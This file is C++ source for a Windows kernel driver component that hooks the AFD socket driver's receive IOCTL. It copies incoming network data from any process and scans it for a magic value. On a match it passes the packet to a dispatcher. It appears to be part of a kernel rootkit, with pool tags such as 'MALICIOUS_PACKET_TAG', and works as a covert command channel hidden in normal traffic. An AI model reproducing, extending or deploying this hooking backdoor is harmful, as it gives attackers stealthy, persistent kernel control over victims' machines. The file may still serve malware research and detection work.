/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "AfdHook.h"
#include <ntddstor.h>

/**
	Initialize the AfdHook class, specifically the hooks on all FILE_OBJECTs with the device \Device\Afd.
*/
AfdHook::AfdHook (
	VOID
	)
{
	//
	// Create the FileObjHook instance.
	//
	this->AfdDeviceHook = new (NonPagedPool, AFD_FILE_HOOK_TAG) FileObjHook(AFD_DEVICE_BASE_NAME, HookType::DirectHook, AfdHook::HookAfdIoctl, NULL);
	if (this->AfdDeviceHook == NULL)
	{
		DBGPRINT("AfdHook!AfdHook: Failed to allocate memory for Afd FileObjHook.");
		return;
	}
}

/**
	Hook for IOCTL requests made against \Device\Afd.
	@param OriginalFunction - The original IOCTL function for the Afd driver.
	@param DeviceObject - The real device object associated with the Afd driver.
	@param Irp - The IRP for the current request.
*/
NTSTATUS
AfdHook::HookAfdIoctl (
	_In_ DRIVER_DISPATCH OriginalFunction,
	_In_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
	)
{
	NTSTATUS returnStatus;
	PAFD_RECV_INFO recvInformation;
	PIO_STACK_LOCATION irpStackLocation;

	BOOLEAN deviceControlRequest;
	PVOID inputBuffer;
	ULONG inputBufferLength;
	DWORD ioControlCode;
	PFILE_OBJECT fileObject;
	PRKMUTEX fileObjectLock;

	ULONG totalRecvLength;
	PVOID recvBuffer;
	ULONG currentBufferOffset;
	ULONG currentCopyLength;

	BOOLEAN foundMagic;
	ULONG magicOffset;

	ULONG i;

	PPACKET_DISPATCH packetDispatch;

	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
	deviceControlRequest = FALSE;
	inputBuffer = NULL;
	ioControlCode = 0;
	fileObject = NULL;
	foundMagic = FALSE;
	recvBuffer = NULL;
	packetDispatch = NULL;
	magicOffset = 0;
	fileObjectLock = NULL;

	//
	// Before calling the original function we need to save the passed parameters.
	//
	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
	{
		inputBuffer = irpStackLocation->Parameters.DeviceIoControl.Type3InputBuffer;
		inputBufferLength = irpStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		ioControlCode = irpStackLocation->Parameters.DeviceIoControl.IoControlCode;
		fileObject = irpStackLocation->FileObject;
		deviceControlRequest = TRUE;
	}

	if (fileObject)
	{
		NT_ASSERT(fileObject->FsContext2);
		fileObjectLock = RCAST<PRKMUTEX>(fileObject->FsContext2);
		if (fileObjectLock)
		{
			//
			// Acquire a lock for the file object.
			//
			KeWaitForSingleObject(fileObjectLock, Executive, KernelMode, FALSE, NULL);
		}
	}
	
	//
	// Grab the actual return value.
	//
	returnStatus = OriginalFunction(DeviceObject, Irp);

	//
	// Only process IRP_MJ_DEVICE_CONTROL requests.
	//
	if (deviceControlRequest && fileObject && fileObjectLock)
	{
		if (ioControlCode == IOCTL_AFD_RECV)
		{
			recvInformation = RCAST<PAFD_RECV_INFO>(inputBuffer);
			totalRecvLength = SCAST<ULONG>(Irp->IoStatus.Information);

			//
			// TODO: Remove this later, not necessary.
			//
			DBGPRINT("AfdHook!HookAfdIoctl: recv ProcessId(%i), FileObject(0x%llx), BufferCount(%i), AfdFlags(%i), RecvLength(0x%X), Status(0x%X)", PsGetCurrentProcessId(), fileObject, recvInformation->BufferCount, recvInformation->AfdFlags, totalRecvLength, returnStatus);

			//
			// Dealing with user-mode memory, need to absolutely wrap in a try/catch.
			//
			__try
			{
				ProbeForRead(recvInformation, sizeof(AFD_RECV_INFO), sizeof(ULONG));

				//
				// If the recv wasn't successful, not worth to check.
				//
				if (NT_SUCCESS(returnStatus) == FALSE)
				{
					goto Exit;
				}

				//
				// Sanity check to make sure we have at least one buffer.
				//
				if (recvInformation->BufferCount == 0)
				{
					goto Exit;
				}

				//
				// Make sure the first buffer can fit a magic value.
				//
				if (totalRecvLength < sizeof(DWORD))
				{
					goto Exit;
				}

				//
				// First, allocate the space required to store the entire packet.
				//
				recvBuffer = ExAllocatePoolWithTag(PagedPool, totalRecvLength, MALICIOUS_PACKET_TAG);
				if (recvBuffer == NULL)
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Failed to allocate space for recvBuffer.");
					goto Exit;
				}
				memset(recvBuffer, 0, totalRecvLength);

				//
				// For each buffer, add it to the recvBuffer.
				//
				currentBufferOffset = 0;
				for (i = 0; i < recvInformation->BufferCount; i++)
				{
					//
					// If the current buffer has a length greater than the remaining bytes,
					// copy only the remaining bytes.
					//
					currentCopyLength = totalRecvLength - currentBufferOffset;
					if (recvInformation->BufferArray[i].len <= currentCopyLength)
					{
						//
						// Otherwise, copy the entirety of the buffer.
						//
						currentCopyLength = recvInformation->BufferArray[i].len;
					}

					//
					// Copy the buffer.
					//
					memcpy_s(RCAST<PVOID>(RCAST<ULONG64>(recvBuffer) + currentBufferOffset), totalRecvLength - currentBufferOffset, recvInformation->BufferArray[i].buf, currentCopyLength);
					
					//
					// Increment the current offset by the amount of data we copied.
					//
					currentBufferOffset += currentCopyLength;

					//
					// If we've reached the total bytes received, break.
					//
					if (currentBufferOffset >= totalRecvLength)
					{
						break;
					}
				}

				//
				// Scan the buffer for a magic value.
				// The reason we do not increment by 4 is because we don't know what data
				// prepends the magic. It may well be misaligned.
				// We subtract a DWORD from the length to make sure we aren't
				// reading after the end of the buffer.
				//
				for (i = 0; i <= (totalRecvLength - sizeof(DWORD)); i++)
				{
					if (*RCAST<DWORD*>(RCAST<ULONG64>(recvBuffer) + i) == PACKET_MAGIC)
					{
						magicOffset = i;
						foundMagic = TRUE;
						break;
					}
				}

				//
				// If we didn't find a magic, exit.
				//
				if (foundMagic == FALSE)
				{
					goto Exit;
				}

				DBGPRINT("AfdHook!HookAfdIoctl: Found magic in recv call.");

				//
				// Allocate the packet handler.
				//
				packetDispatch = new (NonPagedPool, AFD_PACKET_DISPATCH_TAG) PacketDispatch(fileObject,
																							DeviceObject,
																							recvInformation,
																							recvBuffer,
																							totalRecvLength,
																							magicOffset);
				if (NT_SUCCESS(packetDispatch->Process()) == FALSE)
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Failed to process the packet.");
				}
				else
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Processed the packet successfully.");
				}


			}
			__except (1)
			{
				DBGPRINT("AfdHook!HookAfdIoctl: WARNING: Exception.");
			}
		}
	}
Exit:
	if (fileObjectLock)
	{
		KeReleaseMutex(fileObjectLock, FALSE);
	}
	if (packetDispatch)
	{
		ExFreePoolWithTag(packetDispatch, AFD_PACKET_DISPATCH_TAG);
	}
	if (recvBuffer)
	{
		ExFreePoolWithTag(recvBuffer, MALICIOUS_PACKET_TAG);
	}
	return returnStatus;
}